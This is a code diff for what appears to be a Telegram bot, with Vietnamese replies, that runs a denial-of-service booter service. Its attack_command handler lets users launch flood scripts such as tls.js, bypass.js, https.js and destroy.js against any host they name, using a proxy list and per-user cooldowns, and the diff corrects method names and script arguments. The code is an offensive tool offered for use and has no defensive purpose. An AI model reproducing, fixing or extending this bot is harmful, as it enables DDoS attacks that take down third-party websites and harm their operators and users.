@@ -217,13 +217,13 @@ def attack_command(message):
                 bot.reply_to(message, f"Không Được Phép Tấn Công Trang Web Có Tên Miền {blocked_domain}")
                 return
 
-    if method in ['TLS-', 'RAPID', 'BYPASS', 'RAW', 'HYDRA', 'HTTPS', 'MIX', 'DESROY']:
+    if method in ['TLS', 'RAPID', 'BYPASS', 'RAW', 'HYDRA', 'HTTPS', 'MIX', 'DESROY']:
         # Update the command and duration based on the selected method
         if method == 'TLS':
             command = ["node", "tls.js", host, "90", "64", "7", "live.txt"]
             duration = 90
         if method == 'HYDRA':
-            command = ["node", "TLS-3.js", host, "90", "64", "7", "live.txt"]
+            command = ["node", "tls-3.js", host, "90", "64", "7", "live.txt"]
             duration = 90
         if method == 'BYPASS':
             command = ["node", "bypass.js", host, "90", "64", "7", "live.txt"]
@@ -238,10 +238,10 @@ def attack_command(message):
             command = ["node", "mix.js", host, "90", "64", "7", "live.txt"]
             duration = 90
         if method == 'HTTPS':
-            command = ["node", "https.js", host, "90", "64", "live.txt", "live.txt"]
+            command = ["node", "https.js", host, "90", "64", "live.txt", "64"]
             duration = 90
         if method == 'DESTROY':
-            command = ["node", "destroy.js", host, "90", "7", "live.txt", "64"]
+            command = ["node", "destroy.js", host, "90", "64", "10", "live.txt"]
             duration = 90
         cooldown_dict[username] = {'attack': current_time}
 
